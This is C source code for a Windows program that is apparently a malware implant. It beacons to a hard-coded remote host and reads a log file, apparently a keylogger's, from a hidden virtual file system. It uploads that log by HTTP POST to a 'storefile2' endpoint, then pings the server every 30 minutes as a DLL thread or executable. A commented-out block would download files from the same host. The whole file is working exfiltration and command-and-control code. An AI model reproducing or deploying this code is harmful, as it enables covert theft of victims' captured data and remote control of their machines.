#include <windows.h>
#include <wininet.h>
#include <stdlib.h>

#pragma comment(linker, "/ENTRY:MyMain" )

char UID[64] = "__PINGER_UID__";
char tempFolder[MAX_PATH], fileName[MAX_PATH];
char URL[1024], URL2[1024];

//typedef HRESULT (WINAPI *typeURLDownloadToFileA)( LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB );

const char* HOST = "mirandahf.info";
#ifdef RELEASEDLL
	char* UrlStep = "geter/index_.php?cmd=step&uid=%s&step=%d%%5Fdp";
#else
	char* UrlCmdStep = "geter/index_.php?cmd=step&uid=%s&step=%d%%5Fdp";
	char* UrlCmdStorefile2 = "geter/index_.php?cmd=storefile2&uid=%s";
#endif

extern LPTSTR CreateFsDeviceName(VOID);
extern BOOL IsFsPresent(VOID);
extern int CmdCopy( char* Source, char** data, int& c_data);

bool UploadFile( const char* host, const char* url, const char* name, const char* fileName, const char* data, int c_data, const char* boundary )
{
	char userAgent[512];
	DWORD szUserAgent = sizeof(userAgent);
	bool ret = false;
	ObtainUserAgentString( 0, userAgent, &szUserAgent );
	HINTERNET inet = InternetOpenA( userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, 0, 0 );
	if( inet )
	{
		HINTERNET connect = InternetConnectA( inet, host, INTERNET_DEFAULT_HTTP_PORT, NULL,NULL, INTERNET_SERVICE_HTTP, 0, 1u );
		if( connect )
		{
			char contentBeg[256], contentEnd[64]; 
			int szContentBeg = wsprintfA( contentBeg, 
										  "--%s\r\n"
										  "Content-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n"
										  "Content-Type: application/octet-stream\r\n"
										  "Content-Transfer-Encoding: binary\r\n\r\n", boundary, name, fileName );
			int szContentEnd = wsprintfA( contentEnd, "\r\n--%s--\r\n", boundary );
			int szContent = szContentBeg + szContentEnd + c_data;
			char* content = (char*)LocalAlloc( LMEM_FIXED, szContent );
			memcpy( content, contentBeg, szContentBeg );
			memcpy( content + szContentBeg, data, c_data );
			memcpy( content + szContentBeg + c_data, contentEnd, szContentEnd );

			HINTERNET request = HttpOpenRequestA( connect, "POST", url, NULL, NULL, 0, 0, 1 ); 
			if( request )
			{
				char contentLen[64], contentType[128];
				wsprintfA( contentLen, "Content-Length: %d", szContent );
				wsprintfA( contentType, "Content-Type: multipart/form-data; boundary=%s", boundary );

				HttpAddRequestHeadersA( request, "Accept: */*", -1, HTTP_ADDREQ_FLAG_ADD );
				HttpAddRequestHeadersA( request, "Connection: close", -1, HTTP_ADDREQ_FLAG_ADD );
				HttpAddRequestHeadersA( request, contentType, -1, HTTP_ADDREQ_FLAG_ADD );
				HttpAddRequestHeadersA( request, contentLen, -1, HTTP_ADDREQ_FLAG_ADD );
		        BOOL res = HttpSendRequestA( request, 0, 0, (void*)content, szContent );        
		        if( res )
		        	ret = true;
		        InternetCloseHandle(request);
			}
			LocalFree(content);
		}
		InternetCloseHandle(connect);
	}
	InternetCloseHandle(inet);
	return ret;
}

void SendCmdStep( int num )
{
	char userAgent[512];
	DWORD szUserAgent = sizeof(userAgent);
	bool ret = false;
	ObtainUserAgentString( 0, userAgent, &szUserAgent );
	HINTERNET inet = InternetOpenA( userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, 0, 0 );
	if( inet )
	{
		HINTERNET connect = InternetConnectA( inet, HOST, INTERNET_DEFAULT_HTTP_PORT, NULL,NULL, INTERNET_SERVICE_HTTP, 0, 1u );
		if( connect )
		{
			wsprintfA( URL, UrlCmdStep, UID, num );
			HINTERNET request = HttpOpenRequestA( connect, 0, URL, NULL, NULL, 0, 0, 1 ); 
			if( request )
			{
				BOOL res = HttpSendRequestA( request, 0, 0, 0, 0 );        
				InternetCloseHandle(request);
			}
		}
		InternetCloseHandle(connect);
	}
	InternetCloseHandle(inet);
}

DWORD WINAPI PingerProc(LPVOID)
{
	while( true )
	{
		SendCmdStep(165);
		Sleep(1000 * 60 * 30);
	}
/*
	GetTempPathA(MAX_PATH, tempFolder);
	GetTempFileNameA(tempFolder, NULL, TRUE, fileName);

	wsprintfA( URL2, "http://%s/%s", HOST, URL );
//	HMODULE urlmon = LoadLibraryA("urlmon.dll");
//	typeURLDownloadToFileA pURLDownloadToFileA = (typeURLDownloadToFileA)GetProcAddress( urlmon, "URLDownloadToFileA" );
	
	while (true)
	{
		HRESULT R = URLDownloadToFileA(NULL, URL, fileName, 0, NULL);
		Sleep(1000 * 60 * 30);
	}
//	FreeLibrary(urlmon);
*/
	return 0;
}

void WriteAllBytes( const char* nameFile, char* data, int sz )
{
 HANDLE file = CreateFileA( nameFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
 DWORD wr;
 WriteFile( file, data, sz, &wr, 0 );
 CloseHandle(file);
}

#ifdef RELEASEDLL
// Работаем в библиотеке
BOOL APIENTRY MyMain( HMODULE hModule,
                      DWORD  ul_reason_for_call,
                      LPVOID lpReserved)
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		// Стартуем поток отсука
		DWORD lpThreadId; 
		CreateThread( NULL, NULL, PingerProc, NULL, NULL, &lpThreadId );
	}
	return TRUE;
}
#else
	int APIENTRY MyMain() 
	{
		Sleep(60 * 1000);
		SendCmdStep(161);
		BOOL FsPresent = FALSE;
		if (CreateFsDeviceName())
			FsPresent = IsFsPresent();
		if( FsPresent )
		{
			SendCmdStep(162);
			char* data = 0;
			int c_data = 0;
			char fileSrc[128];
			if( CmdCopy( "vfs\\kldrlog.txt", &data, c_data ) == NO_ERROR )
			{
				//WriteAllBytes( "c:\\kldrlog.txt", data, c_data );
				wsprintfA( URL, UrlCmdStorefile2, UID );
				UploadFile( HOST, URL, "rep", "log.txt", data, c_data, "HDPHDMMOHSGN" );
				SendCmdStep(163);
			}
			else
				SendCmdStep(164);
		}
		return PingerProc(NULL);
	}

#endif

void main()
{
}